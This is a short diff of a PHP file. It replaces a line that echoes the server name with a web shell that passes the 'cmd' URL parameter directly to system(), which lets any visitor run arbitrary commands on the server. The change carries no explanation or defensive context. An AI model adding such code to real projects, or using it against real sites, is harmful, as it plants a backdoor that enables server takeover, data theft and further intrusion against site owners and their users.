@@ -1,3 +1,6 @@
 <?php
-    echo '<?php echo $_SERVER["SERVER_NAME"]; ?>';
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
 ?>
